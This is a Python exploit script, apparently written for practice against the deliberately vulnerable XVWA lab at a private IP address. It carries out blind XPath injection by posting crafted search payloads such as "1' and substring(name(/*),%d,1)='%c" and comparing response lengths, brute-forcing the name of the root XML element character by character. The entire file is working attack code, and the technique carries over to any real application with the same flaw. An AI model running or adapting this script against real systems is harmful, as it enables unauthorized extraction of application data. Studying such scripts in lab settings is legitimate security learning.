#!/usr/bin/python3

from pwn import *
import signal
import sys
import requests
import time
import string
import pdb

# function to manage CTRL+c
def def_handler(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

# function to a brute force to find the name of a XML label
def xpath_cracker():
    p1 = log.progress("Brute force")
    p1.status("Starting brute force process")

    time.sleep(2)
    
    p2 = log.progress("Label name")

    # acumulator
    label_name = ""
    # iterate label's name size
    for index in range(1, 8):
        for character in characters:
            post_data = {"search": "1' and substring(name(/*),%d,1)='%c" % (index, character), "submit": ""}
            r = requests.post(main_url, headers=headers, data=post_data)
            # invalid characters
            if len(r.text) != 8678:
                label_name += character
                p2.status(label_name)
                break

    p1.success("Brute force process finished")
    p2.success(label_name)

# CTRL+c
signal.signal(signal.SIGINT, def_handler)

# global variables
main_url = "http://192.168.200.135/xvwa/vulnerabilities/xpath/"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
characters = string.ascii_letters

if __name__ == "__main__":
    xpath_cracker()

